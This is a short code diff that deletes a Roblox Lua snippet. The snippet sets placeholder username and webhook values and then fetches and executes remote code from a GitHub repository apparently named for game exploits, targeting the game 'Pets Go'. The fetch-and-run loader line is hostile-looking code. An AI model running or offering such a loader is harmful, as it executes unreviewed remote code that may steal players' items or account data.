@@ -1,5 +1,0 @@
-Username = "1234567890"
-Username2 = "1234567890"
-Webhook = "134567890"
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Zenith-Exploits-Empire/Final/refs/heads/main/RAW%20-%20pets%20go"))()
